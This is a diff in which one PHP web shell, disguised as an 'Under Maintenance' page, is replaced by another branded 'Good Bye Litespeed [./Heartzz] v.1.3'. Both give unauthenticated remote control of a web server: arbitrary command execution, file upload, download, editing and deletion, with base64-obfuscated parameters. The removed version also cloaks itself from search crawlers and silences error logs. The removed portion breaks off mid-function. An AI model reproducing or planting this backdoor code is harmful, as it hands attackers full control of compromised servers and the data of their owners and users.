@@ -1,601 +1,278 @@
-<?php
-error_reporting(0);
-set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-if (version_compare(PHP_VERSION, '7', '<')) {
-	@set_magic_quotes_runtime(0);
-}
-
-$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
-
-$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
-if (!empty($_SERVER['HTTP_USER_AGENT'])) {
-	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
-	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-		header('HTTP/1.0 404 Not Found');
-		exit;
-	}
-}
-
-if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-	//@ob_clean();
-	$file = $_GET['file'];
-	if (file_exists($file)) {
-		header('Content-Description: File Transfer');
-		header('Content-Type: application/octet-stream');
-		header('Content-Disposition: attachment; filename=' . basename($file));
-		header('Content-Transfer-Encoding: binary');
-		header('Expires: 0');
-		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
-		header('Pragma: public');
-		header('Content-Length: ' . filesize($file));
-		ob_clean();
-		flush();
-		readfile($file);
-		exit;
-	} else {
-		die('The provided file path is not valid.');
-	}
-}
-
-if ($_POST['upload']) {
-	if (@copy($_FILES['file']['tmp_name'], path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'] . "")) {
-		$act = color(1, 2, "Uploaded!") . " at <i><b>" . path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'] . "</b></i>";
-	} else {
-		$act = color(1, 1, "Failed to upload file!");
-	}
-}
-
-?>
-
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-	<meta charset="utf-8">
-	<title>Under Maintenance</title>
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/css/materialize.min.css">
-	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-
-	<style>
-		#content {
-			margin: 20px;
-		}
-
-		textarea {
-			overflow-y: scroll;
-			height: 300px;
-		}
-	</style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Good Bye Litespeed</title>
+    <link href="https://fonts.googleapis.com/css?family=Arial+Black&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        * {
+            cursor: url(https://ani.cursors-4u.net/cursors/cur-13/cur1161.ani), auto !important;
+        }
+    </style>
 </head>
+<body class="bg-gray-900 text-white font-sans">
+<div class="container mx-auto p-4">
+    <?php
+    $timezone = date_default_timezone_get();
+    date_default_timezone_set($timezone);
+    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
+    $scriptDirectory = dirname(__FILE__);
 
-<body class="grey lighten-2">
-	<ul id="dropdown1" class="dropdown-content">
-		<li><a href="#!">Reverse</a></li>
-		<li><a href="#!">Port Hoax</a></li>
-		<li><a href="#!">Jumping</a></li>
-	</ul>
-	<nav>
-		<div class="nav-wrapper teal darken-3">
-			<ul id="nav-mobile" class="right hide-on-med-and-down">
-				<li><a href="?">Home</a></li>
-				<li><a href="?act=cmd&#38;dir=<?php print path(); ?>">Cmd</a></li>
-				<li>
-					<a class="dropdown-button" href="#!" data-activates="dropdown1">Tools<i class="material-icons right">arrow_drop_down</i></a>
-				</li>
-			</ul>
-		</div>
-	</nav>
+    function x($b) {
+        return base64_encode($b);
+    }
 
-	<div class="row">
-		<div class="col s12">
-			<div id="content" class="card white">
-				<div class="card-content black-text">
-					<span class="card-title"><b>Server Info</b></span>
-					<div class="row">
-						<div class="col s6">
-							<?php serverinfo1(); ?>
-						</div>
-						<div class="col s6">
-							<?php serverinfo2(); ?>
+    function y($b) {
+        return base64_decode($b);
+    }
 
-						</div>
-					</div>
+    foreach ($_GET as $c => $d) $_GET[$c] = y($d);
 
-					<div class="row">
-						<form class="" action="" method="post" enctype="multipart/form-data">
-							<div class="col s6">
-								<p><b>Upload File:</b></p>
-								<div class="file-field input-field">
-									<div class="btn">
-										<span>File</span>
-										<input type="file" name="file">
-									</div>
-									<div class="file-path-wrapper">
-										<input class="file-path validate" type="text">
-									</div>
-								</div>
-								<?php if ($_POST['upload']) echo $act; ?>
-							</div>
-							<div class="col s6">
-								<p><b>Options:</b></p><br>
-								<input type="submit" name="upload" value="Upload" class="waves-effect waves-light btn"> :::
-								<a href="?act=newfile<?php if (isset($_GET['dir'])) print '&#38dir=' . path(); ?>" class="waves-effect waves-light btn">New File</a>
-								<a href="?act=newfolder<?php if (isset($_GET['dir'])) print '&#38dir=' . path(); ?>" class="waves-effect waves-light btn">New Folder</a>
-							</div>
-						</form>
-					</div>
-					<hr>
-					<?php content(); ?>
-					<hr>
-					<p>Keisatsu</p>
-				</div>
-			</div>
-		</div>
+    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
+    chdir($currentDirectory);
 
-		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/js/materialize.min.js"></script>
+    $viewCommandResult = '';
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        if (isset($_FILES['fileToUpload'])) {
+            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
+            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+                echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success";
+            } else {
+                echo "Sorry, there was an error uploading your file.";
+            }
+        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
+            if (!file_exists($newFolder)) {
+                mkdir($newFolder);
+                echo '<hr>Folder created successfully!';
+            } else {
+                echo '<hr>Error: Folder already exists!';
+            }
+        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
+            $fileName = $_POST['file_name'];
+            $newFile = $currentDirectory . '/' . $fileName;
+            if (!file_exists($newFile)) {
+                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                    echo '<hr>File created successfully!';
+                } else {
+                    echo '<hr>Error: Failed to create file!';
+                }
+            } else {
+                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                    echo '<hr>File edited successfully!';
+                } else {
+                    echo '<hr>Error: Failed to edit file!';
+                }
+            }
+        } elseif (isset($_POST['delete_file'])) {
+            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+            if (file_exists($fileToDelete)) {
+                if (is_dir($fileToDelete)) {
+                    if (deleteDirectory($fileToDelete)) {
+                        echo '<hr>Folder deleted successfully!';
+                    } else {
+                        echo '<hr>Error: Failed to delete folder!';
+                    }
+                } else {
+                    if (unlink($fileToDelete)) {
+                        echo '<hr>File deleted successfully!';
+                    } else {
+                        echo '<hr>Error: Failed to delete file!';
+                    }
+                }
+            } else {
+                echo '<hr>Error: File or directory not found!';
+            }
+        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+            $oldName = $currentDirectory . '/' . $_POST['old_name'];
+            $newName = $currentDirectory . '/' . $_POST['new_name'];
+            if (file_exists($oldName)) {
+                if (rename($oldName, $newName)) {
+                    echo '<hr>Item renamed successfully!';
+                } else {
+                    echo '<hr>Error: Failed to rename item!';
+                }
+            } else {
+                echo '<hr>Error: Item not found!';
+            }
+        } elseif (isset($_POST['cmd_input'])) {
+            $command = $_POST['cmd_input'];
+            $descriptorspec = [
+                0 => ['pipe', 'r'],
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ];
+            $process = proc_open($command, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                $errors = stream_get_contents($pipes[2]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                proc_close($process);
+                if (!empty($errors)) {
+                    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($errors) . '</textarea>';
+                } else {
+                    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($output) . '</textarea>';
+                }
+            } else {
+                $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
+            }
+        } elseif (isset($_POST['view_file'])) {
+            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+            if (file_exists($fileToView)) {
+                $fileContent = file_get_contents($fileToView);
+                $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($fileContent) . '</textarea>';
+            } else {
+                $viewCommandResult = '<hr><p>Error: File not found!</p>';
+            }
+        }
+    }
+
+    echo '<div class="text-center mb-8">
+            <h1 class="text-4xl font-bold">Good Bye Litespeed [./Heartzz]</h1>
+            <p class="text-lg italic">v.1.3</p>
+        </div>';
+    echo "<p>Zona waktu server: " . $timezone . "</p>";
+    echo "<p>Waktu server saat ini: " . date('Y-m-d H:i:s') . "</p>";
+    echo '<hr class="my-4">';
+    echo '<div class="mb-4">curdir: ';
+
+    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+    $currentPath = '';
+    $homeLinkPrinted = false;
+    foreach ($directories as $index => $dir) {
+        $currentPath .= DIRECTORY_SEPARATOR . $dir;
+        if ($index == 0) {
+            echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400">' . $dir . '</a>';
+        } else {
+            echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400">' . $dir . '</a>';
+        }
+    }
+
+    echo ' / <a href="?d=' . x($scriptDirectory) . '" class="text-green-400">[ GO Home ]</a>';
+    echo '</div>';
+    echo '<hr class="my-4">';
+
+    echo '<div class="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4 mb-8">';
+    echo '<button onclick="openModal(\'createFolderModal\')" class="w-full p-2 bg-green-500 text-white rounded-md">Create Folder</button>';
+    echo '<button onclick="openModal(\'createEditFileModal\')" class="w-full p-2 bg-blue-500 text-white rounded-md">Create / Edit File</button>';
+    echo '<button onclick="openModal(\'uploadFileModal\')" class="w-full p-2 bg-yellow-500 text-white rounded-md">Upload File</button>';
+    echo '<button onclick="openModal(\'runCommandModal\')" class="w-full p-2 bg-red-500 text-white rounded-md">Run Command</button>';
+    echo '</div>';
+
+    echo $viewCommandResult;
+
+    echo '<div>';
+    echo '</div>';
+    echo '<div class="overflow-x-auto max-w-full">';
+    echo '<table class="table-auto w-full bg-gray-800 text-gray-300 border border-gray-600 rounded-md">';
+    echo '<thead><tr class="bg-gray-700"><th class="px-4 py-2">Item Name</th><th class="px-4 py-2">Size</th><th class="px-4 py-2">Date</th><th class="px-4 py-2">Permissions</th><th class="px-4 py-2">View</th><th class="px-4 py-2">Delete</th><th class="px-4 py-2">Rename</th></tr></thead>';
+    echo '<tbody>';
+    foreach (scandir($currentDirectory) as $v) {
+        $u = realpath($v);
+        $s = stat($u);
+        $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?d=' . x($currentDirectory) . '&f=' . x($v);
+        $permission = substr(sprintf('%o', fileperms($u)), -4);
+        $writable = is_writable($u);
+        echo '<tr class="' . ($writable ? 'bg-gray-600' : 'bg-gray-700') . '">
+                <td class="border px-4 py-2"><a href="' . $itemLink . '" class="text-blue-400">' . $v . '</a></td>
+                <td class="border px-4 py-2">' . filesize($u) . '</td>
+                <td class="border px-4 py-2">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>
+                <td class="border px-4 py-2">' . $permission . '</td>
+                <td class="border px-4 py-2"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="View" class="bg-blue-500 text-white rounded-md p-2"></form></td>
+                <td class="border px-4 py-2"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="Delete" class="bg-red-500 text-white rounded-md p-2"></form></td>
+                <td class="border px-4 py-2"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="old_name" value="' . htmlspecialchars($v) . '"><input type="text" name="new_name" placeholder="New Name" class="w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md"><input type="submit" name="rename_item" value="Rename" class="w-full p-2 bg-yellow-500 text-white rounded-md"></form></td>
+            </tr>';
+    }
+    echo '</tbody></table></div>';
+    function deleteDirectory($dir) {
+        if (!file_exists($dir)) {
+            return true;
+        }
+        if (!is_dir($dir)) {
+            return unlink($dir);
+        }
+        foreach (scandir($dir) as $item) {
+            if ($item == '.' || $item == '..') {
+                continue;
+            }
+            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+                return false;
+            }
+        }
+        return rmdir($dir);
+    }
+    ?>
+</div>
+
+<!-- Create Folder Modal -->
+<div id="createFolderModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
+        <h2 class="text-xl mb-4">Create Folder</h2>
+        <form method="post">
+            <input type="text" name="folder_name" placeholder="Folder Name" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('createFolderModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" class="w-full p-2 bg-green-500 text-white rounded-md">Create</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Create / Edit File Modal -->
+<div id="createEditFileModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
+        <h2 class="text-xl mb-4">Create / Edit File</h2>
+        <form method="post">
+            <input type="text" name="file_name" placeholder="File Name" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
+            <textarea name="file_content" placeholder="File Content" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md"></textarea>
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('createEditFileModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" class="w-full p-2 bg-blue-500 text-white rounded-md">Save</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Upload File Modal -->
+<div id="uploadFileModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
+        <h2 class="text-xl mb-4">Upload File</h2>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="fileToUpload" id="fileToUpload" placeholder="Select file:" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('uploadFileModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" name="submit" class="w-full p-2 bg-yellow-500 text-white rounded-md">Upload</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Run Command Modal -->
+<div id="runCommandModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
+        <h2 class="text-xl mb-4">Run Command</h2>
+        <form method="post">
+            <input type="text" name="cmd_input" placeholder="Enter command" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('runCommandModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" class="w-full p-2 bg-red-500 text-white rounded-md">Run</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+    function openModal(modalId) {
+        document.getElementById(modalId).classList.remove('hidden');
+    }
+
+    function closeModal(modalId) {
+        document.getElementById(modalId).classList.add('hidden');
+    }
+</script>
 </body>
-
 </html>
-
-<?php
-
-function serverinfo1()
-{
-	$output[] = "Server IP " . color(1, 2, $GLOBALS['SERVERIP']) . " / Your IP " . color(1, 2, $_SERVER['REMOTE_ADDR']);
-	$output[] = "Web Server  : " . color(1, 2, $_SERVER['SERVER_SOFTWARE']);
-	$output[] = "System      : " . color(1, 2, php_uname());
-	$output[] = "User / Group: " . color(1, 2, usergroup()->name) . "(" . color(1, 2, usergroup()->uid) . ") / " . color(1, 2, usergroup()->group) . "(" . color(1, 2, usergroup()->gid) . ")";
-	$output[] = "HDD         : " . color(1, 2, hdd()->used) . " / " . color(1, 2, hdd()->size) . " (Free: " . color(1, 2, hdd()->free) . ")";
-	$output[] = "PHP Ver : " . color(1, 2, @phpversion());
-
-	print implode("<br>", $output);
-}
-
-function serverinfo2()
-{
-	$disable_functions = @ini_get('disable_functions');
-	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
-	$output[] = "Safe Mode   : " . (@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
-	$output[] = "Disable Func: $disable_functions";
-	$output[] = lib_installed();
-	$output[] = "Current Dir: (" . writeable(path(), perms(path())) . ") ";
-	print implode("<br>", $output);
-	pwd();
-}
-
-function color($bold = 1, $colorid = null, $string = null)
-{
-	$color = array(
-		"</span>",  			# 0 off
-		"<span class='red-text'>",	# 1 red
-		"<span class='green-text'>",	# 2 lime
-		"<span class='white-text'>",	# 3 white
-		"<span class='gold-text'>",	# 4 gold
-	);
-	return ($string !== null) ? $color[$colorid] . $string . $color[0] : $color[0];
-}
-
-function usergroup()
-{
-	if (!function_exists('posix_getegid')) {
-		$user['name'] 	= @get_current_user();
-		$user['uid']  	= @getmyuid();
-		$user['gid']  	= @getmygid();
-		$user['group']	= "?";
-	} else {
-		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
-		$user['gid'] 	= @posix_getgrgid(posix_getegid());
-		$user['name'] 	= $user['uid']['name'];
-		$user['uid'] 	= $user['uid']['uid'];
-		$user['group'] 	= $user['gid']['name'];
-		$user['gid'] 	= $user['gid']['gid'];
-	}
-	return (object) $user;
-}
-
-function perms($path)
-{
-	$perms = fileperms($path);
-	if (($perms & 0xC000) == 0xC000) {
-		// Socket
-		$info = 's';
-	} elseif (($perms & 0xA000) == 0xA000) {
-		// Symbolic Link
-		$info = 'l';
-	} elseif (($perms & 0x8000) == 0x8000) {
-		// Regular
-		$info = '-';
-	} elseif (($perms & 0x6000) == 0x6000) {
-		// Block special
-		$info = 'b';
-	} elseif (($perms & 0x4000) == 0x4000) {
-		// Directory
-		$info = 'd';
-	} elseif (($perms & 0x2000) == 0x2000) {
-		// Character special
-		$info = 'c';
-	} elseif (($perms & 0x1000) == 0x1000) {
-		// FIFO pipe
-		$info = 'p';
-	} else {
-		// Unknown
-		$info = 'u';
-	}
-	// Owner
-	$info .= (($perms & 0x0100) ? 'r' : '-');
-	$info .= (($perms & 0x0080) ? 'w' : '-');
-	$info .= (($perms & 0x0040) ?
-		(($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
-	// Group
-	$info .= (($perms & 0x0020) ? 'r' : '-');
-	$info .= (($perms & 0x0010) ? 'w' : '-');
-	$info .= (($perms & 0x0008) ?
-		(($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
-	// World
-	$info .= (($perms & 0x0004) ? 'r' : '-');
-	$info .= (($perms & 0x0002) ? 'w' : '-');
-	$info .= (($perms & 0x0001) ?
-		(($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
-	return $info;
-}
-
-function exe($cmd)
-{
-	if (function_exists('system')) {
-		@ob_start();
-		@system($cmd);
-		$buff = @ob_get_contents();
-		@ob_end_clean();
-		return $buff;
-	} elseif (function_exists('exec')) {
-		@exec($cmd, $results);
-		$buff = "";
-		foreach ($results as $result) {
-			$buff .= $result;
-		}
-		return $buff;
-	} elseif (function_exists('passthru')) {
-		@ob_start();
-		@passthru($cmd);
-		$buff = @ob_get_contents();
-		@ob_end_clean();
-		return $buff;
-	} elseif (function_exists('shell_exec')) {
-		$buff = @shell_exec($cmd);
-		return $buff;
-	}
-}
-
-function lib_installed()
-{
-	$lib[] = "MySQL: " . (function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
-	$lib[] = "cURL: " . (function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
-	$lib[] = "WGET: " . (exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
-	$lib[] = "Perl: " . (exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
-	$lib[] = "Python: " . (exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
-	return implode(" | ", $lib);
-}
-
-function OS()
-{
-	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
-}
-
-function path()
-{
-	if (isset($_GET['dir'])) {
-		$dir = str_replace("\\", "/", $_GET['dir']);
-		@chdir($dir);
-	} else {
-		$dir = str_replace("\\", "/", getcwd());
-	}
-	return $dir;
-}
-
-function disk()
-{
-	$dir = explode("/", path());
-	return $dir[0];
-}
-
-function pwd()
-{
-	$dir = explode("/", path());
-	foreach ($dir as $key => $index) {
-		print "<a href='?dir=";
-		for ($i = 0; $i <= $key; $i++) {
-			print $dir[$i];
-			if ($i != $key) {
-				print "/";
-			}
-		}
-		print "'>$index</a>/";
-	}
-	print "<br>";
-	print (OS() === "Windows") ? windisk() : "";
-}
-
-function windisk()
-{
-	$letters = "";
-	$v = explode("\\", path());
-	$v = $v[0];
-	foreach (range("A", "Z") as $letter) {
-		$bool = $isdiskette = in_array($letter, array("A"));
-		if (!$bool) $bool = is_dir("$letter:\\");
-		if ($bool) {
-			$letters .= "[ <a href='?dir=$letter:\\'" . ($isdiskette ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"" : "") . ">";
-			if ($letter . ":" != $v) {
-				$letters .= $letter;
-			} else {
-				$letters .= color(1, 2, $letter);
-			}
-			$letters .= "</a> ]";
-		}
-	}
-	if (!empty($letters)) {
-		print "Detected Drives $letters<br>";
-	}
-}
-
-function writeable($path, $perms)
-{
-	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
-}
-
-function hddsize($size)
-{
-	if ($size >= 1073741824)
-		return sprintf('%1.2f', $size / 1073741824) . ' GB';
-	elseif ($size >= 1048576)
-		return sprintf('%1.2f', $size / 1048576) . ' MB';
-	elseif ($size >= 1024)
-		return sprintf('%1.2f', $size / 1024) . ' KB';
-	else
-		return $size . ' B';
-}
-
-function hdd()
-{
-	if (OS() === "Windows") {
-		$hdd['size'] = hddsize(disk_total_space(disk()));
-		$hdd['free'] = hddsize(disk_free_space(disk()));
-		$hdd['used'] = $hdd['size'] - $hdd['free'];
-	} else {
-		$hdd['size'] = hddsize(disk_total_space("/"));
-		$hdd['free'] = hddsize(disk_free_space("/"));
-		$hdd['used'] = $hdd['size'] - $hdd['free'];
-	}
-	return (object) $hdd;
-}
-
-function indexing()
-{
-	if (!is_dir(path())) die(color(1, 1, "Directory '" . path() . "' is not exists."));
-	if (!is_readable(path())) die(color(1, 1, "Directory '" . path() . "' not readable."));
-
-	print '<table width="100%" class="table_home striped" border="0" cellpadding="3" cellspacing="1" align="center">
-      <thead>
-		   <tr>
-		   <th class="th_home"><center>Name</center></th>
-		   <th class="th_home"><center>Type</center></th>
-		   <th class="th_home"><center>Size</center></th>
-		   <th class="th_home"><center>Last Modified</center></th>
-		   <th class="th_home"><center>Owner/Group</center></th>
-		   <th class="th_home"><center>Permission</center></th>
-		   <th class="th_home"><center>Action</center></th>
-		   </tr>
-      </thead>';
-
-	if (function_exists('opendir')) {
-		if ($opendir = opendir(path())) {
-			while (($readdir = readdir($opendir)) !== false) {
-				$dir[] = $readdir;
-			}
-			closedir($opendir);
-		}
-		sort($dir);
-	} else {
-		$dir = scandir(path());
-	}
-
-	foreach ($dir as $folder) {
-		$dirinfo['path'] = path() . DIRECTORY_SEPARATOR . $folder;
-		if (!is_dir($dirinfo['path'])) continue;
-		$dirinfo['type']  = filetype($dirinfo['path']);
-		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
-		$dirinfo['size']  = "-";
-		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
-		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>" : ($folder === "." ?  "<a href='?dir=" . path() . "'>$folder</a>" : "<a href='?dir=" . $dirinfo['path'] . "'>$folder</a>"));
-		$dirinfo['action'] = ($folder === '.' || $folder === '..') ? "-" : "<a href='?act=rename_folder&dir=" . $dirinfo['path'] . "'><i class='small material-icons'>class</i></a>  <a href='?act=delete_folder&dir=" . $dirinfo['path'] . "'><i class='small material-icons'>delete</i></a>";
-		if (function_exists('posix_getpwuid')) {
-			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
-			$dirinfo['owner'] = $dirinfo['owner']->name;
-		} else {
-			$dirinfo['owner'] = fileowner($dirinfo['path']);
-		}
-		if (function_exists('posix_getgrgid')) {
-			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
-			$dirinfo['group'] = $dirinfo['group']->name;
-		} else {
-			$dirinfo['group'] = filegroup($dirinfo['path']);
-		}
-		print "<tr>";
-		print "<td class='td_home'><i class='tiny material-icons amber-text'>perm_media</i> " . $dirinfo['link'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $dirinfo['type'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $dirinfo['size'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $dirinfo['time'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $dirinfo['owner'] . DIRECTORY_SEPARATOR . $dirinfo['group'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $dirinfo['perms'] . "</td>";
-		print "<td class='td_home' style='padding-left: 15px;'><center>" . $dirinfo['action'] . "</center></td>";
-		print "</tr>";
-	}
-	foreach ($dir as $files) {
-		$fileinfo['path'] = path() . DIRECTORY_SEPARATOR . $files;
-		if (!is_file($fileinfo['path'])) continue;
-		$fileinfo['type'] = filetype($fileinfo['path']);
-		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
-		$fileinfo['size'] = filesize($fileinfo['path']) / 1024;
-		$fileinfo['size'] = round($fileinfo['size'], 3);
-		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size'] / 1024, 2) . "MB" : $fileinfo['size'] . "KB";
-		$fileinfo['perms'] = writeable($fileinfo['path'], perms($fileinfo['path']));
-		if (function_exists('posix_getpwuid')) {
-			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
-			$fileinfo['owner'] = $fileinfo['owner']->name;
-		} else {
-			$fileinfo['owner'] = fileowner($fileinfo['path']);
-		}
-		if (function_exists('posix_getgrgid')) {
-			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
-			$fileinfo['group'] = $fileinfo['group']->name;
-		} else {
-			$fileinfo['group'] = filegroup($fileinfo['path']);
-		}
-		print "<tr>";
-		print "<td class='td_home'><i class='tiny material-icons red-text'>description</i> <a href='?act=view&dir=" . path() . "&file=" . $fileinfo['path'] . "'>$files</a></td>";
-		print "<td class='td_home' style='text-align: center;'>" . $fileinfo['type'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $fileinfo['size'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $fileinfo['time'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $fileinfo['owner'] . DIRECTORY_SEPARATOR . $fileinfo['group'] . "</td>";
-		print "<td class='td_home' style='text-align: center;'>" . $fileinfo['perms'] . "</td>";
-		print "<td class='td_home' style='padding-left: 15px;'><center><a href='?act=edit&dir=" . path() . "&file=" . $fileinfo['path'] . "'><i class='small material-icons'>mode_edit</i></a>  <a href='?act=rename&dir=" . path() . "&file=" . $fileinfo['path'] . "'><i class='small material-icons'>class</i></a>  <a href='?act=delete&dir=" . path() . "&file=" . $fileinfo['path'] . "'><i class='small material-icons'>delete</i></a>  <a href='?act=download&dir=" . path() . "&file=" . $fileinfo['path'] . "'><i class='small material-icons'>play_for_work</i></a></center></td>";
-		print "</tr>";
-	}
-
-	print '</table>';
-}
-
-function content()
-{
-	if (isset($_GET['do'])) {
-		if ($_GET['do'] === "cmd") {
-			if (isset($_POST['cmd'])) {
-				print "<pre>" . exe($_POST['cmd']) . "</pre>";
-			}
-		}
-	} elseif (isset($_GET['act'])) {
-		if ($_GET['act'] === 'newfile') {
-			if ($_POST['save']) {
